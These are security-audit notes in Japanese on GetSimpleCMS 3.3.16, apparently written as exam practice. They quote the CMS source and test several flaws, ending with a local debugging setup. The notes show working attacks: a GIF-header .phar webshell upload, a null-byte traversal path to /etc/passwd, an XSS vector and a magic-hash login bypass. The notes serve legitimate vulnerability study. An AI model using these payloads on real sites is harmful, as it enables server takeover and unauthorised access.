あと、`$redirect_url = $_POST['redirectto']; // @todo sanitize redirects, not sure what this is for, js sets pages.php always?`ではサニタイジングなしでURLをセットしてるけど、開発者がOpen Redirectを指摘されてTODOでサニタイジングすることになってるけどまだ適用はされてないっぽい。  
```php
		// format and clean the responses
		if(isset($_POST['post-title'])) 			{	$title = var_out(xss_clean($_POST['post-title']));	}
		if(isset($_POST['post-metak'])) 			{	$metak = safe_slash_html(strip_tags($_POST['post-metak']));	}
		if(isset($_POST['post-metad'])) 			{	$metad = safe_slash_html(strip_tags($_POST['post-metad']));	}
		if(isset($_POST['post-author'])) 			{	$author = safe_slash_html($_POST['post-author']);	}
		if(isset($_POST['post-template'])) 		{ $template = $_POST['post-template']; }
		if(isset($_POST['post-parent'])) 			{ $parent = $_POST['post-parent']; }
		if(isset($_POST['post-menu'])) 				{ $menu = var_out(xss_clean($_POST['post-menu'])); }
		if(isset($_POST['post-menu-enable'])) { $menuStatus = "Y"; } else { $menuStatus = ""; }
		if(isset($_POST['post-private']) ) 		{ $private = safe_slash_html($_POST['post-private']); }
		if(isset($_POST['post-content'])) 		{	$content = safe_slash_html($_POST['post-content']);	}
		if(isset($_POST['post-menu-order'])) 	{ 
			if (is_numeric($_POST['post-menu-order'])) 
			{
				$menuOrder = $_POST['post-menu-order']; 
			} 
			else 
			{
				$menuOrder = "0";
			}
		}		
		// If saving a new file do not overwrite existing, get next incremental filename, file-count.xml
		// @todo this is a mess, new file existing file should all be determined at beginning of block and defined
		if ( (file_exists($file) && $url != $existingurl) ||  in_array($url,$reservedSlugs) ) {
			$count = "1";
			$file = GSDATAPAGESPATH . $url ."-".$count.".xml";
			while ( file_exists($file) ) {
				$count++;
				$file = GSDATAPAGESPATH . $url ."-".$count.".xml";
			}
			$url = $url .'-'. $count;
		}		
		// if we are editing an existing page, create a backup
		if ( file_exists($file) ) 
		{
			$bakfile = GSBACKUPSPATH."pages/". $url .".bak.xml";
			copy($file, $bakfile);
		}	
		
		$xml = new SimpleXMLExtended('<?xml version="1.0" encoding="UTF-8"?><item></item>');
		$xml->addChild('pubDate', date('r'));

		$note = $xml->addChild('title');
		$note->addCData($title);
		
		$note = $xml->addChild('url');
		$note->addCData($url);
		
		$note = $xml->addChild('meta');
		$note->addCData($metak);
	
		$note = $xml->addChild('metad');
		$note->addCData($metad);
		
		$note = $xml->addChild('menu');
		$note->addCData($menu);
		
		$note = $xml->addChild('menuOrder');
		$note->addCData($menuOrder);
		
		$note = $xml->addChild('menuStatus');
		$note->addCData($menuStatus);
		
		$note = $xml->addChild('template');
		$note->addCData($template);
		
		$note = $xml->addChild('parent');
		$note->addCData($parent);
		
		$note = $xml->addChild('content');
		$note->addCData($content);
		
		$note = $xml->addChild('private');
		$note->addCData($private);
		
		$note = $xml->addChild('author');
		$note->addCData($author);

		exec_action('changedata-save');
		if (isset($_POST['autosave']) && $_POST['autosave'] == 'true' && $autoSaveDraft == true) {
			$status = XMLsave($xml, GSAUTOSAVEPATH.$url);
		} else {
			$status = XMLsave($xml, $file);
		}
		
		//ending actions
		exec_action('changedata-aftersave');
		generate_sitemap();
	
		// redirect user back to edit page 
		if (isset($_POST['autosave']) && $_POST['autosave'] == 'true') {
			echo $status ? 'OK' : 'ERROR';
		} else {
			if(!$status) redirect("edit.php?id=". $url ."&upd=edit-error&type=edit"); 

			if ($_POST['redirectto']!='') {
				$redirect_url = $_POST['redirectto']; // @todo sanitize redirects, not sure what this is for, js sets pages.php always?
			} else {
				$redirect_url = 'edit.php';
			}
			
			if(isset($existingurl)){
				if ($url == $existingurl) {
					// redirect save new file
					redirect($redirect_url."?id=". $url ."&upd=edit-success&type=edit");
				} else {
					// redirect new slug, undo for old slug
					redirect($redirect_url."?id=". $url ."&old=".$existingurl."&upd=edit-success&type=edit");
				}
			}	
			else {
				// redirect new slug
				redirect($redirect_url."?id=". $url ."&upd=edit-success&type=new"); 
			}
		}
	}
} else {
	redirect('pages.php');
}
```
`admin/inc/basic.php`  

```php
/**
 * Safe AddSlashes HTML
 *
 * @since 2.04
 * @author ccagle8
 *
 * @param string $text
 * @return string
 */
function safe_slash_html($text) {
	if (get_magic_quotes_gpc()==0) {
		$text = addslashes(htmlspecialchars($text, ENT_QUOTES, 'UTF-8'));
	} else {
		$text = htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
	}

	return xmlFilterChars($text);
}

/**
 * xmlFilterChars
 *
 * @since  3.3.3
 * @param  str $str string to prepare for xml cdata
 * @return str      filtered string
 */
function xmlFilterChars($str){
	$chr = getRegexUnicode();
	// filter only xml allowed characters
	return preg_replace ('/[^'.$chr['ht'].$chr['lf'].$chr['cr'].$chr['lower'].$chr['upper'].']+/u', ' ', $str);
}

/**
 * getRegexUnicode
 * defines unicode char and char ranges for use in regex filters
 *
 * @since  3.3.3
 * @param  str $id key to return from char range array
 * @return mixed     array or str if id specified of regex char strings
 */
function getRegexUnicode($id = null){
	$chars = array(
		'null'       => '\x{0000}',            // 0 null
		'ht'         => '\x{0009}',            // 9 horizontal tab
		'lf'         => '\x{000a}',            // 10 line feed
		'vt'         => '\x{000b}',            // 11 vertical tab
		'FF'         => '\x{000c}',            // 12 form feed
		'cr'         => '\x{000d}',            // 13 carriage return
		'cntrl'      => '\x{0001}-\x{0019}',   // 1-31 control codes
		'cntrllow'   => '\x{0001}-\x{000c}',   // 1-12 low end control codes
		'cntrlhigh'  => '\x{000e}-\x{0019}',   // 14-31 high end control codes
		'bom'        => '\x{FEFF}',            // 65279 BOM byte order mark
		'lower'      => '\x{0020}-\x{D7FF}',   // 32 - 55295
		'surrogates' => '\x{D800}-\x{DFFF}',   // 55296 - 57343
		'upper'      => '\x{E000}-\x{FFFD}',   // 57344 - 65533
		'nonchars'   => '\x{FFFE}-\x{FFFF}',   // 65534 - 65535
		'privateb'   => '\x{10000}-\x{10FFFD}' // 65536 - 1114109
	);
	if(isset($id)) return $chars[$id];
	return $chars;
}
```

`admin/inc/theme_functions.php`  
どうやらちゃんとHTMLエンティティ化してたのに`strip_decode($title)`でそれをわざわざ解除して`echo`してしまってる様子。なるほどねー。フィルタリングしてるかだけしか確認してないとXSSが発生してるのに気づかないのかー。    
![image](https://user-images.githubusercontent.com/56021519/107235885-7e1e7380-6a68-11eb-9f17-26223685eaeb.png)  

`admin/inc/basic.php`でHTMLエンティティを解除してるのが確認できる。  
```php
/**
 * StripSlashes HTML Decode
 *
 * @since 2.04
 * @author ccagle8
 *
 * @param string $text
 * @return string
 */
function strip_decode($text) {
	$text = stripslashes(htmlspecialchars_decode($text, ENT_QUOTES));
	return $text;
}
```
titleじゃなくてcontentの方は、`<script>alert(1);</alert>`をエンティティ化して`<p>`で囲んで、`<p>&lt;script&gt;alert(1);&lt;/script&gt;</p>`を作ってから、さらにそれをHTMLエンティティ化して`&lt;p&gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/p&gt;`として扱ってる。  
だからcontentの場合は`strip_decode()`を一回しても`<p>&lt;script&gt;alert(1);&lt;/script&gt;</p>`になってXSSは防げてる！  
つまり、titleの方では`strip_decode()`の使い方を間違えてるってことかな？(本来は二重にエンティティ化したものでないと使っちゃダメ？)  
![image](https://user-images.githubusercontent.com/56021519/107237501-254fda80-6a6a-11eb-8fcc-671fe33b1fd9.png)  
![image](https://user-images.githubusercontent.com/56021519/107237323-f3d70f00-6a69-11eb-9a31-e264615428c0.png)  
## Directory Traversal
`admin/edit.php`  
`$path`には`"/var/www/html/GetSimpleCMS-3.3.16/data/pages/"`が入ってて、`$_GET['id']`には何のフィルタリングもないから、`file_exists(/var/www/html/GetSimpleCMS-3.3.16/data/pages/../../../etc/passwd\0.xml)`みたいになってヌルバイト文字列攻撃で`/etc/passwd`を読み込める。ちなみにヌルバイト文字列攻撃が成立するのはPHP5.3.4まででそれ以降はエラーとか正常に処理される。(7.4ではerror)  
```php
// Get passed variables
$id    = isset($_GET['id'])    ? var_out( $_GET['id']    ): null;
$uri   = isset($_GET['uri'])   ? var_out( $_GET['uri']   ): null; 
$ptype = isset($_GET['type'])  ? var_out( $_GET['type']  ): null;    
$nonce = isset($_GET['nonce']) ? var_out( $_GET['nonce'] ): null;
$path  = GSDATAPAGESPATH;

if ($id){
	// get saved page data
	$file = $id .'.xml';

	if (!file_exists($path . $file)){ 
		redirect('pages.php?error='.urlencode(i18n_r('PAGE_NOTEXIST')));
	}
```

`admin/zip.php`にZIPを解凍する機能があって、zip slipできるかと思ったけど、ZIPファイルは`$saved_zip_file = GSBACKUPSPATH.'zip/'. $timestamp .'_archive.zip';	`しか開けなくて外部から制御できないので無理そう…  
## XSSできない例
`http://localhost/admin/edit.php?title=aaaaaa%3Ch1%3Ebbba%3C/h1%3E`でアクセスすると、`$id`がないからifの中には入らないっぽい。  
`$_GET['title'] = "aaaaaa<h1>bbba</h1>"`  
`$title = "aaaaaa&#60;h1&#62;bbba&#60;/h1&#62;"`  
```php
// Get passed variables
$id    = isset($_GET['id'])    ? var_out( $_GET['id']    ): null;
$uri   = isset($_GET['uri'])   ? var_out( $_GET['uri']   ): null; 
$ptype = isset($_GET['type'])  ? var_out( $_GET['type']  ): null;    
$nonce = isset($_GET['nonce']) ? var_out( $_GET['nonce'] ): null;
$path  = GSDATAPAGESPATH;

// Page variables reset
$theme_templates = ''; 
$parents_list = ''; 
$keytags = '';
$parent = '';
$template = '';
$menuStatus = ''; 
$private = ''; 
$menu = ''; 
$content = '';
$author = '';
$title = '';
$url = '';
$metak = '';
$metad = '';

if ($id){
	// get saved page data
	$file = $id .'.xml';
	if (!file_exists($path . $file)){ 
		redirect('pages.php?error='.urlencode(i18n_r('PAGE_NOTEXIST')));
	}

	$data_edit = getXML($path . $file);
	$title = stripslashes($data_edit->title);
	$pubDate = $data_edit->pubDate;
	$metak = stripslashes($data_edit->meta);
	$metad = stripslashes($data_edit->metad);
	$url = $data_edit->url;
	$content = stripslashes($data_edit->content);
	$template = $data_edit->template;
	$parent = $data_edit->parent;
	$author = $data_edit->author;
	$menu = stripslashes($data_edit->menu);
	$private = $data_edit->private;
	$menuStatus = $data_edit->menuStatus;
	$menuOrder = $data_edit->menuOrder;
	$buttonname = i18n_r('BTN_SAVEUPDATES');
} else {
	// prefill fields is provided
	$title      =  isset( $_GET['title']      ) ? var_out( $_GET['title']      ) : '';
	$template   =  isset( $_GET['template']   ) ? var_out( $_GET['template']   ) : '';
	$parent     =  isset( $_GET['parent']     ) ? var_out( $_GET['parent']     ) : '';
	$menu       =  isset( $_GET['menu']       ) ? var_out( $_GET['menu']       ) : '';
	$private    =  isset( $_GET['private']    ) ? var_out( $_GET['private']    ) : '';
	$menuStatus =  isset( $_GET['menuStatus'] ) ? var_out( $_GET['menuStatus'] ) : '';
	$menuOrder  =  isset( $_GET['menuOrder']  ) ? var_out( $_GET['menuOrder']  ) : '';
	$buttonname =  i18n_r('BTN_SAVEPAGE');
}
```

## file upload
`admin/upload.php`  
一見`str_replace`で一回だけ`../`のパターンをはじいてるのでDirectry Traversal行けそうに見えるが`path_is_safe()`で安全な場所を抜けてるかどうかチェックしてるので無理。  
```php
if (isset($_GET['path']) && !empty($_GET['path'])) {
	$path = str_replace('../','', $_GET['path']);
	$path = tsl("../data/uploads/".$path);
	// die if path is outside of uploads
	if(!path_is_safe($path,GSDATAUPLOADPATH)) die();
	$subPath = str_replace('../','', $_GET['path']);
	$subFolder = tsl($subPath);
} else { 
	$path = "../data/uploads/";
	$subPath = ''; 
	$subFolder = '';
}
```
`if(getDef('GSUPLOADSLC',true)) $extension = lowercase($extension);`で拡張子を小文字に直してる。これで`.Php`とかでブラックリストをバイパスしようとしても`.php`と直されるのでダメ。  
というか、拡張子とMIME Typeにブラックリストを使用してる時点でかなりやばいのでそこを中心に見ていく。  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#other-extensions  
を見てみるとどうやら`.php7`がブラックリストに入ってない！  
MIME TypeはBurpでテキトーに`image/webp`とかに書き換えてみる。  
ファイルの検証をしている部分は`validate_safe_file()`なので次はそこを見る。  
```php
			//set variables
			$count = '1';
			$file = $_FILES["file"]["name"][$i];

			$extension = pathinfo($file,PATHINFO_EXTENSION);
			if(getDef('GSUPLOADSLC',true)) $extension = lowercase($extension);
	  		$name      = pathinfo($file,PATHINFO_FILENAME);
			$name      = clean_img_name(to7bit($name));
			$base      = $name . '.' . $extension;

			$file_loc = $path . $base;
			
			//prevent overwriting
			while ( file_exists($file_loc) ) {
				$file_loc = $path . $count.'-'. $base;
				$base = $count.'-'. $base;
				$count++;
			}
			
			//validate file
			if (validate_safe_file($_FILES["file"]["tmp_name"][$i], $_FILES["file"]["name"][$i])) {
				move_uploaded_file($_FILES["file"]["tmp_name"][$i], $file_loc);
				if (defined('GSCHMOD')) {
					chmod($file_loc, GSCHMOD);
				} else {
					chmod($file_loc, 0644);
				}
				exec_action('file-uploaded');
				
				// generate thumbnail				
				require_once('inc/imagemanipulation.php');	
				genStdThumb($subFolder,$base);					
				$messages[] = i18n_r('FILE_SUCCESS_MSG').': <a href="'. $SITEURL .'data/uploads/'.$subFolder.$base.'">'. $SITEURL .'data/uploads/'.$subFolder.$base.'</a>';
			} else {
				$errors[] = $_FILES["file"]["name"][$i] .' - '.i18n_r('ERROR_UPLOAD');
			}
```

コメントにもある通り、Burpで改竄した`$_FILES`のMIME Typeは見てくれなくて、`file_mime_type()`でファイルの内容から判断している。  
```php
/**
 * Validate Safe File
 * NEVER USE MIME CHECKING FROM BROWSERS, eg. $_FILES['userfile']['type'] cannot be trusted
 * @since 3.1
 * @uses file_mime_type
 * @uses $mime_type_blacklist
 * @uses $file_ext_blacklist
 *
 * @param string $file, absolute path
 * @param string $name, filename
 * @param string $mime, optional
 * @return bool
 */	
function validate_safe_file($file, $name, $mime = null){
	global $mime_type_blacklist, $file_ext_blacklist, $mime_type_whitelist, $file_ext_whitelist;

	include(GSADMININCPATH.'configuration.php');

	$file_extension = lowercase(pathinfo($name,PATHINFO_EXTENSION));
	if(!$mime)$mime = file_mime_type($file);

	if ($mime && $mime_type_whitelist && in_arrayi($mime, $mime_type_whitelist)) {
		return true;
	}
	if ($file_ext_whitelist && in_arrayi($file_extension, $file_ext_whitelist)) {
		return true;
	}

	// skip blackist checks if whitelists exist
	if($mime_type_whitelist || $file_ext_whitelist) return false;

	if ($mime && in_arrayi($mime, $mime_type_blacklist)) {
		return false;	
	} elseif (in_arrayi($file_extension, $file_ext_blacklist)) {
		return false;	
	} else {
		return true;	
	}
}
```
`admin/inc/basic.php`  
実際には`finfo_file()`,`mime_content_type()`のどっちかかで判断してる。つまりWebshellはきつそう…？？  
でもPHARファイルならいけるのでは？？？  
でも`phar://`のパスを`file_exists()`とかに挿入することができないと意味ないけど…  
```php
/**
 * Get File Mime-Type
 *
 * @since 3.1
 * @param $file, absolute path
 * @return string/bool
 */
function file_mime_type($file) {
	if (!file_exists($file)) {
		return false;
		exit;
	}
	if(function_exists('finfo_open')) {
		# http://www.php.net/manual/en/function.finfo-file.php
		$finfo = finfo_open(FILEINFO_MIME_TYPE);
		$mimetype = finfo_file($finfo, $file);
		finfo_close($finfo);
		
	} elseif(function_exists('mime_content_type')) {
		# Depreciated: http://php.net/manual/en/function.mime-content-type.php
		$mimetype = mime_content_type($file);
	} else {
		return false;
		exit;	
	}
	return $mimetype;
}
```
GIFのヘッダーを入れておけば`mime_content_type()`をバイパスできる！また、拡張子として`.phar`が禁止されてないのでこれでWebshellアップロードできた！  
```txt
takabayashi@takabayashi-VirtualBox:~/AWAE$ cat evil.phar 
GIF89a;
<?php
  system('whoami'); # shellcode goes here
?>
takabayashi@takabayashi-VirtualBox:~/AWAE$ 
```
以下はPOC  
![image](https://user-images.githubusercontent.com/56021519/107334411-0567f780-6afa-11eb-84cc-5caa5da2cbb2.png)  
![image](https://user-images.githubusercontent.com/56021519/107334438-10228c80-6afa-11eb-809d-b1dafd6fe1af.png)  
![image](https://user-images.githubusercontent.com/56021519/107334491-20d30280-6afa-11eb-93ea-da8c98fee0b6.png)  
## XXE
`admin/api.php`の以下にXXEがあるのでは？？  
と思ったけど、`libxml_disable_entity_loader();`によってXMLの外部参照を禁止しているのでXXE対策はされている。  
また、`simplexml_load_string($_POST['data'], 'SimpleXMLExtended', LIBXML_NOCDATA);`のうち第三引数が`LIBXML_NOENT`になってないと実体参照はできないらしい。でもPHPのコンパイルオプションによっては第一引数だけで実体参照できたりすることもあるらしい。  
```php
	// disable entity loading to avoid xxe
	libxml_disable_entity_loader();

	#step 1 - check post for data
	if (!isset($_POST['data'])) {
		$message = array('status' => 'error', 'message' => i18n_r('API_ERR_MISSINGPARAM'));
		echo json_encode($message);
		exit;
	};
	
	#step 2 - setup request
	$in = simplexml_load_string($_POST['data'], 'SimpleXMLExtended', LIBXML_NOCDATA);
	$request = new API_Request();
	$request->add_data($in);
```
## login bypass
`admin/login_functions.php`  
`if ( ($userid == $USR) && ($password == $PASSWD) ) {`が主なログインチェック。  
入力されたパスワードを`sha1()`ハッシュにして、それと事前のadminのsha1ハッシュを比較してる。  
`==`の弱い比較を使っているが、両方ともsha1ハッシュになるので、以下のように数字の0として解釈されるようなMagic hash同士でないとバイパスは無理そう。  
つまり、もしadminのパスワードとして`0e数字...`となるようなmagichashになるパスワードを使用していた場合、他のmagichashになるパスワードを代わりに使ってログイン可能ということ。  
```txt
php > var_dump("0e66507019969427134894567494305185566735" == "0e94685489941557404937568181716894429726");
php shell code:1:
bool(true)
php > 
```
```php
# was the form submitted?
if(isset($_POST['submitted'])) { 
	
	# initial variable setup
	$user_xml = GSUSERSPATH . _id($_POST['userid']).'.xml';
	$userid = strtolower($_POST['userid']);
	$password = $_POST['pwd'];
	$error = null;
	
	# check the username or password fields
	if ( !$userid || !$password ) {
		$error = i18n_r('FILL_IN_REQ_FIELD');
	} 
	
	# check for any errors
	if ( !$error ) {
		
		exec_action('successful-login-start');
		
		# hash the given password
		$password = passhash($password);

		# does this user exist?
		if (file_exists($user_xml)) {

			# pull the data from the user's data file
			$data = getXML($user_xml);
			$PASSWD = $data->PWD;
			$USR = strtolower($data->USR);

			# do the username and password match?
			if ( ($userid == $USR) && ($password == $PASSWD) ) {
				$authenticated = true;
			} else {
				$authenticated = false;

				# add login failure to failed logins log
				$logFailed = new GS_Logging_Class('failedlogins.log');
				$logFailed->add('Username',$userid);
				$logFailed->add('Reason','Invalid Password');

			} # end password match check
			
		} else {
			# user doesnt exist in this system
			$authenticated = false;

			# add login failure to failed logins log
			$logFailed = new GS_Logging_Class('failedlogins.log');
			$logFailed->add('Username',$userid);
			$logFailed->add('Reason','Invalid User');
		}		
		
		# is this successful?
		if( $authenticated ) {
			# YES - set the login cookie, then redirect user to secure panel		
			create_cookie();
			exec_action('successful-login-end');
			redirect($cookie_redirect); 
		} else {
			# NO - show error message
			$error = i18n_r('LOGIN_FAILED');
			$logFailed->save();
		} # end authenticated check
```
今回は事前に`aaroZmOk`としてadminのパスワードを指定しておいて、`w9KASOk6Ikap`をログイン時に入力すればログイン成功となった。  
ただ、開発者はsha1ハッシュ時にsaltを指定していればそれも使えるようにしているので、それならこれは無理だしそもそもmagichashのパスワードをadminとして指定してなければ影響はないので、まあほぼ悪用不可能ではある。  
![image](https://user-images.githubusercontent.com/56021519/107338118-888b4c80-6afe-11eb-990f-77fee3e11971.png)  
![image](https://user-images.githubusercontent.com/56021519/107338221-a658b180-6afe-11eb-866d-1a670d4bd24b.png)  

## password reset
別におかしな箇所なし。  
多分XSSで、CSRFトークン付きのPassword resetリクエストを投げれば権限昇格とかができるっぽい？？  
```txt
# was the form submitted?
if(isset($_POST['submitted'])) {
	
	# first check for csrf
	if (!defined('GSNOCSRF') || (GSNOCSRF == FALSE) ) {
		$nonce = $_POST['nonce'];
		if(!check_nonce($nonce, "save_settings")) {
			die("CSRF detected!");	
		}
	}
	
	# check to see if passwords are changing
	if(isset($_POST['sitepwd'])) { $pwd1 = $_POST['sitepwd']; }
	if(isset($_POST['sitepwd_confirm'])) { $pwd2 = $_POST['sitepwd_confirm']; }
	if ($pwd1 != $pwd2 && $pwd2 != '')	{
		#passwords do not match 
		$error = i18n_r('PASSWORD_NO_MATCH');
	} else {
		# password cannot be null
		if ( $pwd1 != '' && $pwd2 != '') { 
			$PASSWD = passhash($pwd1); 
		}	
```

# デバッグ環境
Ubuntu 20.04.01にphp7.4とかを入れて、Xdebugとかを入れた。これをUbuntu上のVScodeでデバッグする。    
Xdebugは以下を参考にして入れたが、これだけだとなんかデバッグできなかったので、追加で`sudo apt install php-xdebug`で入れると動いた！なんか設定ファイルが足りてなかったんだと思う。  
https://60can.hatenablog.jp/entry/wsl2-ubuntu%25e3%2581%25aephp%25e3%2581%25abxdebug%25e3%2582%2592%25e8%25bf%25bd%25e5%258a%25a0%25e3%2581%2597%25e3%2581%25a6vscode%25e3%2581%25a7%25e3%2583%2587%25e3%2583%2590%25e3%2583%2583%25e3%2582%25b0%25e3%258  
最終的な設定ファイルは以下。  
`.vscode/launch.json`
```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Listen for XDebug",
            "type": "php",
            "request": "launch",
            "port": 9000,
            "pathMappings": {
                "${workspaceRoot}" : "${workspaceRoot}"
            }
        },
        {
            "name": "Launch currently open script",
            "type": "php",
            "request": "launch",
            "program": "${file}",
            "cwd": "${fileDirname}",
            "port": 9000
        }
    ]
}
```
`/etc/php/7.4/apache2/php.ini`  
以下をこのファイルに追加する。  
```txt
[XDebug]
zend_extension = /usr/lib/php/20190902/xdebug.so
xdebug.remote_enable = 1
xdebug.remote_connect_back = 1
xdebug.remote_autostart = 1
xdebug.remote_port = 9000
xdebug.remote_host="127.0.0.1"
```
VSCodeにはPHP Intellisenseっている拡張を入れて、関数とかの定義もとにジャンプできるようにした。  
